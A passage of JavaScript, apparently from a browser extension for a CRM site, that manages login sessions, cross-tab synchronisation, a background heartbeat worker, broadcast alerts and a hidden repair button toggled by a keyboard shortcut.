                color: '#000', padding: '10px 20px', borderRadius: '8px', zIndex: '2147483647',
                fontWeight: 'bold', fontSize: '13px', boxShadow: '0 5px 15px rgba(0,0,0,0.5)',
                transition: 'opacity 0.5s', opacity: '0', pointerEvents: 'none'
            });
            document.body.appendChild(aviso);
            requestAnimationFrame(() => aviso.style.opacity = '1');
            setTimeout(() => {
                aviso.style.opacity = '0';
                setTimeout(() => aviso.remove(), 500);
            }, 3000);
        }

        // 🛠️ 7. SINCRONIZACIÓN DE "RESTABLECER" (Solo reacciona la página principal/listado)
        if (e.key === 'SST_SYNC_REPAIR' && e.newValue) {
            if (!window.location.href.includes('/detail')) {
                if (typeof window.SST_GLOBAL_REPAIR === 'function') window.SST_GLOBAL_REPAIR();
            }
        }

        // (El evento de sincronizar la alerta de Cierre de Sesión se ha eliminado)
        // La sesión se cierra globalmente por la red gracias al borrado de 'usuarioLogueado'
    });

    // 2. DISPARO INMEDIATO AL ACTIVAR PESTAÑA (🔥 FIX CLAVE)
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            localStorage.setItem('CRM_TAB_VISIBLE_TS', Date.now().toString());
            // Si pasaron más de 5 seg desde el último chequeo, CHEQUEAR YA.
            if (Date.now() - lastHeartbeatTime > 5000) {
                heartbeat(true); // Le avisa al escudo que viene por un cambio de pestaña visual
            }
        }
    });

    // 3. WORKER INMORTAL
    let useWorker = true;
    try {
        const workerBlob = new Blob([`
            self.onmessage = function(e) {
                if(e.data === 'start') setInterval(() => postMessage('tick'), 20000);
            };
        `], { type: 'application/javascript' });
        
        const backgroundWorker = new Worker(URL.createObjectURL(workerBlob));
        backgroundWorker.onmessage = function(e) {
            if (e.data === 'tick') {
                if (isValidCrmDomain()) {
                    heartbeat();
                    checkLogoutButton();
                    checkRepairButton(); // <--- AÑADIDO
                }
            }
        };
        backgroundWorker.postMessage('start');
    } catch (e) {
        useWorker = false;
        console.warn("Worker bloqueado, usando reloj clásico.");
    }

    if (!useWorker) {
        setInterval(() => {
            if (isValidCrmDomain()) {
                heartbeat();
                checkLogoutButton();
                checkRepairButton(); // <--- AÑADIDO
            }
        }, 20000);
    }

    // 🔥 BUCLE DE VIGILANCIA UI 
    setInterval(() => { 
        checkTimerWidget(); 
        checkLogoutButton(); 
        checkRepairButton(); // <--- AÑADIDO
    }, 1000);

    window.addEventListener('keydown', (e) => {
        const isMac = navigator.userAgent.toUpperCase().indexOf('MAC OS') >= 0 || (navigator.userAgentData && navigator.userAgentData.platform === 'macOS');
        const modifierKey = isMac ? e.metaKey : e.ctrlKey;
        
        if (modifierKey && e.shiftKey && (e.key === 'z' || e.key === 'Z')) {
            const btnRepair = document.getElementById('crm-hidden-repair-btn');
            const btnLogin = document.getElementById('crm-main-login-btn');
            
            if (btnRepair && btnLogin) {
                e.preventDefault(); 
                if (btnRepair.style.display === 'none') {
                    btnLogin.style.display = 'none';
                    btnRepair.style.display = 'block';
                    btnRepair.style.width = '100%';
                    btnRepair.style.padding = '15px';
                    btnRepair.style.fontSize = '16px'; 
                    btnRepair.innerText = '🧹 REPARAR EXTENSIÓN';
                    btnRepair.animate([{ transform: 'scale(1)' }, { transform: 'scale(1.05)' }, { transform: 'scale(1)' }], { duration: 500, iterations: 1 });
                } else {
                    btnRepair.style.display = 'none';
                    btnLogin.style.display = 'block';
                }
            }
        }
    });

    async function init() {
        if (!isValidCrmDomain()) return; 

        checkRepairButton(); // <--- AÑADIDO

        const user = localStorage.getItem('usuarioLogueado');
        const loginTime = localStorage.getItem('loginTimestamp');
        
        let limit = parseInt(localStorage.getItem('sessionLimit'));
        const isTimeValid = !loginTime || isNaN(limit) || limit === -1 || (Date.now() - parseInt(loginTime) < limit);

        if (user && loginTime && isTimeValid) {
            heartbeat();
            checkLogoutButton();
            checkTimerWidget();
            iniciarEscuchaFirebase(); // 🔥 INICIAMOS FIREBASE AQUÍ

            // 🔥 ANTI-F5: REVISA SI QUEDÓ UN MENSAJE PENDIENTE AL RECARGAR (F5)
            setTimeout(() => {
                const sharedMsg = localStorage.getItem('SHARED_MSG_DATA');
                if (sharedMsg) {
                    try {
                        const data = JSON.parse(sharedMsg);
                        
                        // 🔥 REGLA 1 HORA: Si el mensaje pendiente es muy viejo, lo ignoramos
                        if (Date.now() - data.id > 3600000) return;

                        const isAlertAck = localStorage.getItem('ALERT_ACK_' + data.id);
                        const isNotifAck = localStorage.getItem('NOTIF_ACK_' + data.id);
                        
                        if (data.type === 'ALERT' && !isAlertAck) {
                            showPersistentAlert(data.msg, data.id);
                        } else if (data.type === 'NORMAL' && !isNotifAck) {
                            showNotification('📢 ' + data.msg, data.id, 'info');
                        }
                    } catch(e) {}
                }
            }, 1500);            
        } else {
            removeOverlays();
            showLoginOverlay();
        }
    }

    (async () => {
        if (!document.body) await new Promise(r => setTimeout(r, 500));
        await init();
    })();

    window.addEventListener('popstate', () => { checkLogoutButton(); checkRepairButton(); });
    window.addEventListener('hashchange', () => { checkLogoutButton(); checkRepairButton(); });
    
    // 🔥 OBSERVADOR DE SPA (Vue.js Router) - Detecta cambios de URL en tiempo real
    let lastAuthUrl = location.href;
    new MutationObserver(() => {
        if (location.href !== lastAuthUrl) { 
            lastAuthUrl = location.href; 
            checkLogoutButton(); 
            checkRepairButton(); 
            checkTimerWidget();
        }
    }).observe(document, { subtree: true, childList: true });

    // 🔥 RASTREADOR MULTI-PESTAÑA
    setInterval(() => {
        if (!document.hidden) {
            localStorage.setItem('CRM_TAB_VISIBLE_TS', Date.now().toString());
        }
    }, 2000);

})();
